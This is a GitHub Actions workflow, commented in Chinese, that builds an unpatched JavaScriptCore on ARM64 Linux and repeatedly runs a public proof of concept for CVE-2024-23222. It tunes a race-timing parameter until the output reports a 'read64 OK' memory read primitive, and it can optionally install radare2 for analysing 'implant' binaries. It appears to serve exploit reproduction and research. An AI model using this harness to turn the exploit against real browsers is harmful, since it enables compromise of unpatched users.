# Coruna / CVE-2024-23222 —— ARM64 Linux runner 版
#
# 与 coruna-jsc-rw.yml（macos-14 / Apple Silicon）的分工：
#   macos-14      : 真 Apple Silicon，89% 命中先验直接可用，但只有 7GB RAM / 14GB 磁盘
#   本文件        : ARM64 Linux（4 vCPU / 16GB RAM），内存翻倍，零门槛；但非 Apple 微架构，
#                   PIVOT 必须从头扫，命中率先验为零
#
# 为什么用 ubuntu-22.04-arm 而不是 24.04：
#   WebKit-7617.1.17.13.7 是 2023-11 基线，配 libicu 70.1（22.04）+ gcc-11。
#   24.04 的 ICU 74 + gcc-13 容易在 configure/build 阶段就崩。
#   若提示 "No runner matching the specified labels"，把 runs-on 改成 ubuntu-24.04-arm 再试。
#
# 用法：放进 PUBLIC 仓库的 .github/workflows/ → Actions → Run workflow

name: Coruna JSC RW (ARM64 Linux)

on:
  workflow_dispatch:
    inputs:
      pivot_mode:
        description: 'auto = 先扫 PIVOT 平台期；fixed = 用下面的固定值'
        type: choice
        options: [auto, fixed]
        default: auto
      pivot_fixed:
        description: 'ARM64 云 CPU 平台期未知，先从 165000-195000 扫'
        default: '178000'
      warmup:
        description: 'WARMUP'
        default: '250000'

jobs:
  build-and-hit:
    runs-on: ubuntu-22.04-arm
    timeout-minutes: 350

    env:
      WEBKIT_TAG: WebKit-7617.1.17.13.7
      WARMUP: ${{ github.event.inputs.warmup }}
      PIVOT_MODE: ${{ github.event.inputs.pivot_mode }}
      PIVOT_FIXED: ${{ github.event.inputs.pivot_fixed }}
      GC_FLUSH: '1048576'

    steps:
      - name: 环境自检（架构必须是 aarch64）
        run: |
          echo "=== arch ==="; uname -m
          if [ "$(uname -m)" != "aarch64" ]; then
            echo "::error::不是 aarch64，架构不匹配"
            exit 1
          fi
          echo "=== cpu ==="; lscpu | grep -E 'Model name|^CPU\(s\)|Architecture' || true
          echo "=== mem ==="; free -g
          echo "=== disk ==="; df -h /
          cat /etc/os-release | head -3

      - name: 腾磁盘（runner ~14GB 可用）
        run: |
          sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc \
                      /usr/local/share/boost "$AGENT_TOOLSDIRECTORY" || true
          sudo apt-get clean
          df -h /

      - name: 装构建依赖
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq cmake ninja-build ruby libicu-dev \
                                   build-essential pkg-config
          cmake --version | head -1; ninja --version; ruby --version

      - name: 取 PoC
        run: |
          git clone --depth 1 https://github.com/califio/publications.git califio
          ls -l califio/MADBugs/coruna/poc/
          sha256sum califio/MADBugs/coruna/poc/cve-2024-23222-rw.js | tee poc.sha256

      - name: Clone WebKit（必须全历史）
        run: |
          git clone --filter=blob:none https://github.com/WebKit/WebKit.git webkit
          cd webkit
          git checkout "${WEBKIT_TAG}"
          git rev-parse HEAD
          if [ -f Source/JavaScriptCore/dfg/DFGDesiredObjectProperties.cpp ]; then
            echo "::error::检出的是已修补版本"
            exit 1
          fi
          echo "OK: 未修补"

      - name: 配置 CMake（JSCOnly port）
        run: |
          cd webkit
          # 复刻 build-jsc --jsc-only --release 实际发出的 cmake 命令（从日志逐字抄的），
          # 但接下来只构建 jsc 目标，绕开 testmasm/testb3/testair/testapi/testdfg
          cmake -DPORT=JSCOnly \
                -DCMAKE_BUILD_TYPE=Release \
                -G Ninja \
                -DSHOW_BINDINGS_GENERATION_PROGRESS=1 \
                -DDEVELOPER_MODE=ON \
                -DENABLE_STATIC_JSC=ON \
                -DENABLE_WERROR=OFF \
                -DENABLE_FTL_JIT=ON \
                -S . -B WebKitBuild/Release

      - name: 构建 jsc（只建 jsc 目标）
        run: |
          cd webkit
          # 关键：build-jsc 默认会一起构建 jsc testb3 testair testapi testmasm testdfg，
          # 其中 testmasm.cpp 在新版 GCC 下触发 -Werror=type-limits / -Werror=parentheses，
          # 而 jsc 并不依赖这些测试工具。这里只显式构建 jsc。
          cmake --build WebKitBuild/Release --config Release -- jsc -j4
          echo "=== 产物 ==="
          find WebKitBuild -name jsc -type f -exec ls -lh {} \;

      - name: 冒烟测试
        run: |
          cd webkit
          JSC=$(find WebKitBuild -name jsc -type f | head -1)
          echo "JSC=$JSC" | tee -a "$GITHUB_ENV"
          "$JSC" -e 'print("jsc alive on " + (0xdeadbeef).toString(16))'

      - name: 先证 tgcp 可达
        run: |
          "$JSC" califio/MADBugs/coruna/poc/cve-2024-23222-tgcp-reach.js 2>&1 | tail -40 || true

      - name: 扫 PIVOT 平台期
        if: env.PIVOT_MODE == 'auto'
        run: |
          POC=califio/MADBugs/coruna/poc/cve-2024-23222-rw.js
          echo "warmup=${WARMUP} gc_flush=${GC_FLUSH}"
          BEST=0; BEST_HITS=0
          for p in $(seq 165000 3000 195000); do
            hits=0
            for i in $(seq 1 10); do
              if "$JSC" "$POC" -- "${WARMUP}" "$p" "${GC_FLUSH}" 2>&1 | grep -q "read64 OK"; then
                hits=$((hits+1))
              fi
            done
            printf "PIVOT=%-7d  %2d/10\n" "$p" "$hits"
            if [ "$hits" -gt "$BEST_HITS" ]; then BEST_HITS=$hits; BEST=$p; fi
          done
          echo "PLATEAU_BEST_PIVOT=${BEST}" | tee -a "$GITHUB_ENV"
          echo "PLATEAU_BEST_HITS=${BEST_HITS}" | tee -a "$GITHUB_ENV"

      - name: 定 PIVOT
        run: |
          if [ "$PIVOT_MODE" = "auto" ]; then P="${PLATEAU_BEST_PIVOT:-178000}"; else P="$PIVOT_FIXED"; fi
          echo "FINAL_PIVOT=$P" | tee -a "$GITHUB_ENV"

      - name: 打到命中（竞态一进程一次，必须重起进程）
        run: |
          POC=califio/MADBugs/coruna/poc/cve-2024-23222-rw.js
          echo "FINAL_PIVOT=${FINAL_PIVOT}"
          n=0; MAX=80
          while [ "$n" -lt "$MAX" ]; do
            n=$((n+1))
            OUT=$("$JSC" "$POC" -- "${WARMUP}" "${FINAL_PIVOT}" "${GC_FLUSH}" 2>&1)
            if echo "$OUT" | grep -q "read64 OK"; then
              echo "========== HIT on attempt ${n} (PIVOT=${FINAL_PIVOT}) =========="
              echo "$OUT"
              echo "$OUT" > HIT_OUTPUT.txt
              exit 0
            fi
            echo "attempt ${n}: miss"
          done
          echo "::warning::${MAX} 次未命中；PIVOT 换算比与 Apple Silicon 不同，需换区间再扫"
          exit 1

      # 顺带：这台机器也能装反汇编器啃那 56 个 arm64 dylib
      - name: 装上 radare2（可选，用于啃 implant）
        if: always()
        continue-on-error: true
        run: |
          sudo apt-get install -y -qq radare2 || (git clone --depth 1 https://github.com/radareorg/radare2.git /tmp/r2 && cd /tmp/r2 && sys/install.sh)
          r2 -v || true

      - name: 上传产物
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: coruna-jsc-arm64-linux
          if-no-files-found: warn
          retention-days: 14
          path: |
            HIT_OUTPUT.txt
            poc.sha256
